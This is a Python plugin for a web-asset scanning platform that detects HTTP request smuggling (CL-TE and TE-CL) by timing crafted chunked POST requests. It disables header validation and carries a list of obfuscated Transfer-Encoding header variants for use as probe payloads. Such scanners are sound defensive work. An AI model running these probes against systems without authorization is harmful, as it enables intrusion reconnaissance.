from requests import Request, Session
from requests.exceptions import ReadTimeout
import collections
import http.client
import requests
from apps.assets.models import Risk
import urllib3
import re
from lib.wechat_notice import wechat
from lib.common import update_scan_status, web_is_online
from loguru import logger

http.client._is_legal_header_name = lambda x: True
http.client._is_illegal_header_value = lambda x: False
urllib3.disable_warnings()

plugin = 'smuggling'


class HTTP_REQUEST_SMUGGLER():

    def __init__(self, url):
        self.headers_payload = []
        self.valid = False
        self.type = ""
        self.url = url
        self.Transfer_Encoding1 = [["Transfer-Encoding", "chunked"],
                                   ["Transfer-Encoding ", "chunked"],
                                   ["Transfer_Encoding", "chunked"],
                                   ["Transfer Encoding", "chunked"],
                                   [" Transfer-Encoding", "chunked"],
                                   ["Transfer-Encoding", "  chunked"],
                                   ["Transfer-Encoding", "chunked"],
                                   ["Transfer-Encoding", "\tchunked"],
                                   ["Transfer-Encoding", "\u000Bchunked"],
                                   ["Content-Encoding", " chunked"],
                                   ["Transfer-Encoding", "\n chunked"],
                                   ["Transfer-Encoding\n ", " chunked"],
                                   ["Transfer-Encoding", " \"chunked\""],
                                   ["Transfer-Encoding", " 'chunked'"],
                                   ["Transfer-Encoding", " \n\u000Bchunked"],
                                   ["Transfer-Encoding", " \n\tchunked"],
                                   ["Transfer-Encoding", " chunked, cow"],
                                   ["Transfer-Encoding", " cow, "],
                                   ["Transfer-Encoding", " chunked\r\nTransfer-encoding: cow"],
                                   ["Transfer-Encoding", " chunk"],
                                   ["Transfer-Encoding", " cHuNkeD"],
                                   ["TrAnSFer-EnCODinG", " cHuNkeD"],
                                   ["Transfer-Encoding", " CHUNKED"],
                                   ["TRANSFER-ENCODING", " CHUNKED"],
                                   ["Transfer-Encoding", " chunked\r"],
                                   ["Transfer-Encoding", " chunked\t"],
                                   ["Transfer-Encoding", " cow\r\nTransfer-Encoding: chunked"],
                                   ["Transfer-Encoding", " cow\r\nTransfer-Encoding: chunked"],
                                   ["Transfer\r-Encoding", " chunked"],
                                   ["barn\n\nTransfer-Encoding", " chunked"],
                                   ]

        self.Transfer_Encoding = list(self.Transfer_Encoding1)

        for x in self.Transfer_Encoding1:
            if " " == x[1][0]:
                for i in [9, 11, 12, 13]:
                    # print (type(chr(i)))
                    c = str(chr(i))
                    self.Transfer_Encoding.append([x[0], c + x[1][1:]])

        self.payload_headers = []
        self.n1 = 1
        for x in self.Transfer_Encoding:
            headers = collections.OrderedDict()
            headers[x[0]] = x[1]
            headers['Cache-Control'] = "no-cache"
            headers['Content-Type'] = "application/x-www-form-urlencoded"
            headers['User-Agent'] = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
            self.payload_headers.append(headers)
            self.n1 = self.n1 + 1

    def detect_CLTE(self, headers={}, payload=""):
        s = Session()
        req = Request('POST', self.url, data=payload)
        prepped = req.prepare()
        prepped.headers = headers
        resp_time = 0
        try:
            resp = s.send(prepped, verify=False, timeout=10)
            resp_time = resp.elapsed.total_seconds()
            return resp_time
        except Exception as e:
            logger.info(e)
            resp_time = 10
            if isinstance(e, ReadTimeout):
                logger.info("* 请求超时")
                return resp_time

    def detect_TECL(self, headers={}, payload=""):
        s = Session()
        req = Request('POST', self.url, data=payload)
        prepped = req.prepare()
        prepped.headers = headers
        resp_time = 0
        try:
            resp = s.send(prepped, verify=False, timeout=10)
            resp_time = resp.elapsed.total_seconds()
        except Exception as e:
            logger.info(e)
            if isinstance(e, ReadTimeout):
                resp_time = 10
                logger.info("* 请求超时")

        # print(resp_time)
        return resp_time

    def check_CLTE(self):
        n = 0
        payloads = self.payload_headers if self.headers_payload == [] else self.headers_payload
        for headers in payloads:
            n = n + 1
            headers['Content-Length'] = 4
            payload = "1\r\nZ\r\nQ\r\n\r\n\r\n"
            t2 = self.detect_CLTE(headers, payload)
            if t2 == None: t2 = 0
            if t2 < 5:
                continue

            headers['Content-Length'] = 11
            payload = "1\r\nZ\r\nQ\r\n\r\n\r\n"
            t1 = self.detect_CLTE(headers, payload)

            if t1 == None: t1 = 1

            logger.info(t1, t2)
            if t2 > 5 and t2 / t1 >= 5:
                self.valid = True
                self.type = "CL-TE"
                self.headers_payload = [headers]
                return True
        return False

    def check_TECL(self):
        n = 0
        payloads = self.payload_headers if self.headers_payload == [] else self.headers_payload
        for headers in payloads:
            n = n + 1
            payload = "0\r\n\r\nX"
            headers['Content-Length'] = 6
            t2 = self.detect_TECL(headers, payload)
            if t2 == None: t2 = 0
            if t2 < 5:
                continue

            payload = "0\r\n\r\n"
            headers['Content-Length'] = 5
            t1 = self.detect_TECL(headers, payload)

            if t1 == None: t1 = 1
            if t2 == None: t2 = 0
            # print (t1, t2)

            if t2 > 5 and t2 / t1 >= 5:
                self.valid = True
                self.type = "TE-CL"
                self.headers_payload = [headers]
                return True
        return False

    def run(self):
        try:
            h = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"}
            requests.get(self.url, headers=h, verify=False, timeout=10)
            if not self.check_CLTE():
                self.check_TECL()
        except Exception as e:
            logger.info("* timeout: " + self.url)
        return self.recheck()

    def recheck(self):
        if self.valid:
            if self.type == "CL-TE":
                if self.check_CLTE():
                    payload_key = list(self.headers_payload[0])[0]
                    payload_value = self.headers_payload[0][payload_key]
                    payload = payload_key + ': ' + payload_value
                    logger.info("[$$$] 发现漏洞 CL-TE: " + self.url)

                    return "CL-TE\n" + payload
            else:
                if self.check_TECL():
                    logger.info("[$$$] 发现漏洞 TE-CL: " + self.url)
                    payload_key = list(self.headers_payload[0])[0]
                    payload_value = self.headers_payload[0][payload_key]
                    payload = payload_key + ': ' + payload_value
                    logger.info(payload)
                    return "TE-Cl\n" + payload


def start(**kwargs):
    webapps = kwargs['webapps']
    policy = kwargs['policy']
    if policy == 'increase':
        webapps = webapps.exclude(scanned__icontains=plugin).order_by('-id')
    if not webapps:
        logger.debug("[%s] %s" % (plugin, 'There are no objects to scan'))

    denominator = len(webapps)
    molecular = 0
    for webapp in webapps:
        subdomain = webapp.subdomain
        molecular += 1
        if not bool(re.search('[a-z]', subdomain.split(':')[1])):
            continue
        logger.info('-' * 75)
        logger.debug("[%s] [%s] %s" % (plugin, webapp.id, subdomain))

        if not web_is_online(subdomain.replace('https://', '')):
            webapp.delete()   # 判断web是否开启443，关闭则删除
            logger.info('[删除] ' + subdomain)
            continue

        try:
            a = HTTP_REQUEST_SMUGGLER(subdomain)
            res = a.run()
            if res:
                logger.info(res)
                Risk.objects.update_or_create(target=subdomain, risk_type='HTTP夹带攻击', defaults={'desc': res})
                title = '发现漏洞'
                content = "漏洞类型：" + plugin
                wechat.send_msg(title, content)
        except Exception as e:
            logger.critical(e)
        if molecular == denominator:
            percent = 100.0
            logger.warning('%s [%d/%d]'%(str(percent)+'%', molecular, denominator))
        else:
            percent = round(1.0 * molecular / denominator * 100, 2)
            logger.warning('%s [%d/%d]'%(str(percent)+'%', molecular, denominator))

        update_scan_status(webapp, 'smuggling')
